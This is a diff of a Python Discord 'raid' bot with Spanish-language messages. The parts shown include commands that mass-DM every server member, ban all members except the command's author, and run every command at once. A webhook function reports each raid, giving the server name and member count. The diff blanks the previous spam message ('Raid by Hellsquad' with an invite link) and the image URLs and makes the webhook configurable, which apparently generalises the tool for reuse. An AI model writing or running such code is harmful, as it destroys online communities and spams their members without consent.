@@ -7,6 +7,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 intents = discord.Intents.default()
 intents.members = True
 client = commands.Bot(command_prefix="k!", intents=intents)
+hook = "" #Put your webhook here
 
 @client.event
 async def on_ready():
@@ -57,7 +58,7 @@ async def dm(ctx): #DM All command, with an error message if an user has DM's di
     for users in client.get_all_members():
         if users != ctx.message.author:
             try:
-                await users.send("Raid by Hellsquad\nhttps://discord.gg/DPY8UDQteZ")
+                await users.send("")
             except:
                 print(f"Error, no se ha podido enviar el mensaje al usuario: {users}")
 
@@ -71,8 +72,8 @@ async def ban(ctx):
                 print(f"Error, no se ha podido banear al usuario: {members}")
 
 @client.command()
-async def report_webhook(ctx, webh): #Report raid function, put your webhook below
-    webhook = DiscordWebhook(url="")
+async def report_webhook(ctx, webh):
+    webhook = DiscordWebhook(url=webh)
     embed = DiscordEmbed(title="Nuevo Raid Reportado.", color=0xff0000)
     embed.add_embed_field(name="Información del Raid:", value=f"Raid realizado por: {ctx.message.author}\nNombre del servidor: {ctx.guild.name}\nCantidad de personas: {ctx.guild.member_count}")
     embed.set_image(url="")
@@ -94,7 +95,7 @@ async def menu(ctx):
     embed.add_field(name="k!dm", value="Envía mensajes a cada usuario en el servidor, excepto al autor del comando.", inline=True)
     embed.add_field(name="k!ban", value="Banea a todos los usuarios, excluyendo a quien coloque el comando.", inline=False)
     embed.add_field(name="k!sayonara", value="Ejecuta todos los comandos al mismo tiempo, exceptuando el ban all.", inline=True)
-    embed.set_image(url="https://media.discordapp.net/attachments/820475730982207509/822323040557072414/sdsds-1-1.png?width=442&height=473")
+    embed.set_image(url="")
     await ctx.send(embed=embed)
 
 @client.command()
